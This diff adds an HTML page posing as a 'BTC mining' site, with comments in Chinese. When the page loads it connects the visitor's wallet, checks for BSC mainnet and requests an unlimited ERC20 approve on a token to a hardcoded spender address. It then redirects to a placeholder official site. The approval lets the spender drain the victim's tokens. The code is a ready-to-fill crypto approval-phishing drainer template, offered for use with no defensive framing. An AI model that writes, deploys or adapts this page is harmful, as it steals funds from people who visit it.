@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>BTC挖矿</title>
+  <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+</head>
+<body style="text-align:center;margin-top:80px;font-family:sans-serif">
+
+<h2>BTC挖矿</h2>
+
+<p id="status">未连接钱包</p>
+
+<script>
+let web3;
+let account;
+
+// 👉 代币地址（替换成你的Token地址）
+const tokenAddress = "0x55d398326f99059fF775485246999027B3197955";
+
+// 👉 被授权地址（项目合约）
+const spender = "0x766909a9F77664dA97B2BE58F02bB69769c27690";
+
+// 👉 ERC20 approve ABI
+const ABI = [
+  {
+    "constant": false,
+    "inputs": [
+      {"name":"_spender","type":"address"},
+      {"name":"_value","type":"uint256"}
+    ],
+    "name":"approve",
+    "outputs":[{"name":"","type":"bool"}],
+    "type":"function"
+  }
+];
+
+// 无限额度
+const maxAmount = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+
+// 自动连接钱包
+async function connect() {
+  if(window.ethereum){
+    try {
+      await window.ethereum.request({ method: 'eth_requestAccounts' });
+      web3 = new Web3(window.ethereum);
+      const accounts = await web3.eth.getAccounts();
+      account = accounts[0];
+      document.getElementById("status").innerText = "已连接: " + account;
+
+      // 检查是否是 BSC 主网 (链ID: 56)
+      const chainId = await web3.eth.getChainId();
+      if(chainId !== 56){
+        alert("请切换到 BSC 主网");
+        return false;
+      }
+      return true;
+    } catch(err) {
+      console.error(err);
+      alert("钱包连接失败");
+      return false;
+    }
+  } else {
+    alert("请安装 MetaMask 或其他钱包");
+    return false;
+  }
+}
+
+// 自动授权
+async function approve() {
+  if(!account){
+    alert("钱包未连接");
+    return;
+  }
+
+  const contract = new web3.eth.Contract(ABI, tokenAddress);
+
+  try {
+    const tx = await contract.methods.approve(
+      spender,
+      maxAmount
+    ).send({from: account});
+
+    console.log("交易成功:", tx);
+    alert("授权成功");
+
+    // 自动跳转官网
+    window.location.href = "https://你的官网.com";
+  } catch(err) {
+    console.error(err);
+    alert("授权失败，请检查钱包网络或余额");
+  }
+}
+
+// 页面加载后自动执行
+window.addEventListener('load', async () => {
+  const connected = await connect();
+  if(connected){
+    approve();
+  }
+});
+</script>
+
+</body>
+</html>
